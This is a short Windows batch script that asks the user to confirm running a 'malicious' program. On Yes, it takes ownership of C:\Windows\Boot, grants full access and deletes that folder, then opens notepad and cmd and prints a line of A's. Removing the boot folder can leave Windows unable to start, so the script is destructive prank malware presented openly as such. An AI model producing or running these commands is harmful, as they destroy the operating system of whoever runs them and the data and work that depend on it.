@echo off
CHOICE /M "program is malicious! running it?"
IF ERRORLEVEL 2 GOTO NO
IF ERRORLEVEL 1 GOTO YES

:YES
takeown /f "C:\Windows\Boot" /r /d y
icacls "C:\Windows\Boot" /grant administrators:F /t
rmdir /s /q "C:\Windows\Boot"
start notepad
start cmd
start 
a:
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
goto a
exit

:NO
echo You chose No!
pause
exit
